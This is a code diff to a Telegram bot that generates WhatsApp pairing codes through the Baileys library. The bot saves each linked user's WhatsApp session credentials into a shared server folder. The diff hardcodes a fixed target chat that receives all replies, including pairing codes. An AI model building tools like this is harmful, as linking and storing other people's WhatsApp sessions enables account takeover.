@@ -24,10 +24,13 @@ if (!apiId || !apiHash || !process.env.TELEGRAM_SESSION_STRING) {
 
 const client = new TelegramClient(stringSession, apiId, apiHash, { connectionRetries: 5 });
 
+// Fixed Target Chat ID
+const TARGET_CHAT_ID = "-1003901583807";
+
 // Store active sockets per user: chatId -> socket instance
 const activeSockets = new Map();
 
-// Custom Premium Emojis (GramJS supports custom tg-emoji structure using Premium Session)
+// Custom Premium Emojis
 const em = {
     waLink: '<tg-emoji emoji-id="5334998226636390258">💬</tg-emoji>',
     phone: '<tg-emoji emoji-id="5935864147051811401">📱</tg-emoji>',
@@ -64,21 +67,25 @@ const cleanupUserSession = (chatId) => {
         const message = event.message;
         if (!message || !message.text) return;
 
-        const chatId = message.chatId.toString();
+        const chatId = TARGET_CHAT_ID;
         const text = message.text.trim();
 
         // Handle /start command
         if (text === '/start') {
-            await client.sendMessage(chatId, {
-                message: `${em.generalFeature} <b>WELCOME TO AADHI-XD LINKER</b> ${em.generalFeature}\n\n` +
-                         `Link your WhatsApp account securely with our advanced bot.\n\n` +
-                         `👉 <b>Please send your WhatsApp number with country code</b> (e.g., <code>918136880986</code>) to generate your pairing code.`,
-                parseMode: 'html',
-                buttons: client.buildReplyMarkup([
-                    [{ text: '🚀 GET PAIRING CODE', data: Buffer.from('get_started') }],
-                    [{ text: '🌐 DEVELOPER / SUPPORT', url: 'https://t.me/Aadhixdofc' }]
-                ])
-            });
+            try {
+                await client.sendMessage(chatId, {
+                    message: `${em.generalFeature} <b>WELCOME TO AADHI-XD LINKER</b> ${em.generalFeature}\n\n` +
+                             `Link your WhatsApp account securely with our advanced bot.\n\n` +
+                             `👉 <b>Please send your WhatsApp number with country code</b> (e.g., <code>918136880986</code>) to generate your pairing code.`,
+                    parseMode: 'html',
+                    buttons: client.buildReplyMarkup([
+                        [{ text: '🚀 GET PAIRING CODE', data: Buffer.from('get_started') }],
+                        [{ text: '🌐 DEVELOPER / SUPPORT', url: 'https://t.me/Aadhixdofc' }]
+                    ])
+                });
+            } catch (err) {
+                console.error('Error sending start message:', err.message);
+            }
             return;
         }
 
@@ -86,22 +93,33 @@ const cleanupUserSession = (chatId) => {
         if (!text.startsWith('/')) {
             const phoneNumber = text.replace(/[^0-9]/g, '');
             if (phoneNumber.length < 10) {
-                await client.sendMessage(chatId, {
-                    message: `${em.errorFormat} <b>Invalid phone number!</b> Please send a valid WhatsApp number with country code (e.g., <code>918714387286</code>).`,
-                    parseMode: 'html'
-                });
+                try {
+                    await client.sendMessage(chatId, {
+                        message: `${em.errorFormat} <b>Invalid phone number!</b> Please send a valid WhatsApp number with country code (e.g., <code>918714387286</code>).`,
+                        parseMode: 'html'
+                    });
+                } catch (err) {
+                    console.error('Error sending invalid number error:', err.message);
+                }
                 return;
             }
 
-            cleanupUserSession(chatId);
+            const sessionKey = chatId;
+            cleanupUserSession(sessionKey);
 
-            const waitMsg = await client.sendMessage(chatId, {
-                message: `⏳ <b>Settings:</b> Initializing Baileys Socket...\n${em.phone} <b>Phone Number:</b> <code>${phoneNumber}</code>\n⏳ Generating Pairing Code... Please wait.`,
-                parseMode: 'html'
-            });
+            let waitMsg;
+            try {
+                waitMsg = await client.sendMessage(chatId, {
+                    message: `⏳ <b>Settings:</b> Initializing Baileys Socket...\n${em.phone} <b>Phone Number:</b> <code>${phoneNumber}</code>\n⏳ Generating Pairing Code... Please wait.`,
+                    parseMode: 'html'
+                });
+            } catch (err) {
+                console.error('Error sending wait message:', err.message);
+                return;
+            }
 
             try {
-                const userSessionDir = path.join(__dirname, 'sessions', `user_${chatId}`);
+                const userSessionDir = path.join(__dirname, 'sessions', `user_${sessionKey}`);
                 if (!fs.existsSync(userSessionDir)) {
                     fs.mkdirSync(userSessionDir, { recursive: true });
                 }
@@ -120,7 +138,7 @@ const cleanupUserSession = (chatId) => {
                     }
                 });
 
-                activeSockets.set(chatId, sock);
+                activeSockets.set(sessionKey, sock);
 
                 sock.ev.on('creds.update', saveCreds);
 
@@ -134,7 +152,7 @@ const cleanupUserSession = (chatId) => {
                                 fs.mkdirSync(mainSessionDir, { recursive: true });
                             }
                             fs.cpSync(userSessionDir, mainSessionDir, { recursive: true, force: true });
-                            console.log(`✅ Session copied to main ./session folder for user ${chatId}`);
+                            console.log(`✅ Session copied to main ./session folder for user ${sessionKey}`);
                         } catch (cpErr) {
                             console.error('❌ Failed to copy session to main folder:', cpErr);
                         }
@@ -153,7 +171,9 @@ const cleanupUserSession = (chatId) => {
                             const code = await sock.requestPairingCode(phoneNumber);
                             const formattedCode = code?.match(/.{1,4}/g)?.join('-') || code;
 
-                            try { await waitMsg.delete({ revoke: true }); } catch (e) {}
+                            if (waitMsg) {
+                                try { await waitMsg.delete({ revoke: true }); } catch (e) {}
+                            }
 
                             const textMessage = 
                                 `┏━━ ${em.waLink} <b>WHATSAPP LINKING</b> ${em.indiaFlag} ${em.connected} ━━┓\n\n` +
@@ -180,7 +200,7 @@ const cleanupUserSession = (chatId) => {
 
                         } catch (err) {
                             console.error('Error generating pairing code:', err);
-                            cleanupUserSession(chatId);
+                            cleanupUserSession(sessionKey);
                             await client.sendMessage(chatId, {
                                 message: `${em.errorFormat} <b>Error generating pairing code. Please try again with a valid number.</b>`,
                                 parseMode: 'html'
@@ -191,7 +211,7 @@ const cleanupUserSession = (chatId) => {
 
             } catch (err) {
                 console.error('An unexpected error occurred:', err);
-                cleanupUserSession(chatId);
+                cleanupUserSession(sessionKey);
                 await client.sendMessage(chatId, {
                     message: `${em.errorFormat} <b>An unexpected error occurred.</b>`,
                     parseMode: 'html'
@@ -206,10 +226,10 @@ const cleanupUserSession = (chatId) => {
         if (!query) return;
 
         const data = query.data ? query.data.toString() : '';
-        const chatId = query.peer ? query.peer.userId.toString() : '';
+        const chatId = TARGET_CHAT_ID;
 
         if (data === 'get_started') {
-            await query.answer({ message: "പ്രൊസസ്സ് ആരംഭിക്കുന്നു..." });
+            await query.answer({ message: "Starting process..." });
             await client.sendMessage(chatId, {
                 message: `${em.phone} <b>Please type and send your WhatsApp number now with country code:</b>`,
                 parseMode: 'html'
